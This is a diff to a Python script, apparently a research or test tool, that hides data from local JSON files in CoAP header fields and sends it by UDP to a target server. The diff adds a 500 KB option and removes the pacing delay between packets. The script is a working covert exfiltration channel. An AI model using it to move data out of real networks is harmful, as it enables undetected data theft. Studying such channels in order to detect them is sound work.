@@ -6,12 +6,12 @@ import argparse, ipaddress, sys, socket, time
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (1, 5, 10 MB)")
+parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (500 KB, 1, 5, 10 MB)")
 parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
 args = parser.parse_args()
 
 size = int(args.Length)
-if size not in [1,5,10]:
+if size not in [1,5,10,500]:
     print("Invalid exfiltration size!")
     sys.exit(1)
 
@@ -27,7 +27,10 @@ PSIZE = 1470
 
 print("\n====================CoAP EXFILTRATION====================\n")
 
-content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern
+if size == 500:
+    content = readFromFile("data_05mb.json")
+else:
+    content = readFromFile(f"data_{size}mb.json")
 #print(type(content))
 #print(len(content))
 print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
@@ -58,7 +61,7 @@ while itertor.getRemainingLength() >= PSIZE:
     #send(get, verbose=False)
     sock.sendto(bytes(x), (SERVER_IP, 5683))
     packet_counter += 1
-    time.sleep(0.001)
+#    time.sleep(0.001)
 
 x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')
 x.options =  [("ETag", itertor.getNextBytes(4))]
